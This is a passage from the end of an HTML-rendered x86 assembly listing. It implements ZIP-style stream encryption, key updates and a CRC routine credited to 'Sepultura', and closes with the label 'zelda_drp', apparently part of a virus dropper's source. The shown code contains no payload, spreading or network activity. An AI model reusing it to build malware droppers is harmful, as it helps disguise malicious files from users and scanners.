 </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

 </span><span class="sc1">; encrypt the random encryption header</span><span class="sc0">
 </span><span class="sc1">; and the actual data stream.</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lhcomsize</span><span class="sc0">
</span><span class="sc5">Encrypt_Stream</span><span class="sc4">:</span><span class="sc0"> 
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Key2</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Update_Keys</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Encrypt_Stream</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">
 </span><span class="sc6">retn</span><span class="sc0">

 </span><span class="sc1">; updates the 3 encryption keys with the character in AL.</span><span class="sc0">
</span><span class="sc5">Update_Keys</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushad</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Key0</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Update_CRC</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Key0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Key1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">134775813</span><span class="sc0">
 </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Key1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">Key2</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Update_CRC</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">Key2</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">
 </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Update_CRC</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">CRC_Init</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Byte_To_CRC</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">CRC</span><span class="sc4">:</span><span class="sc0">        
  </span><span class="sc1">; original code by Sepultura.</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc5">CRC_Init</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">Load_Character</span><span class="sc4">:</span><span class="sc0"> 
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">CRC_Byte</span><span class="sc4">:</span><span class="sc0">       
 </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Loop_CRC_Byte</span><span class="sc0">  
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0EDB88320h</span><span class="sc0">

</span><span class="sc5">Loop_CRC_Byte</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CRC_Byte</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Load_Character</span><span class="sc0">

</span><span class="sc5">Exit_Calc_CRC</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">retn</span><span class="sc0">
      
 </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">zelda_drp</span><span class="sc0">
</span></div></body>
</html>
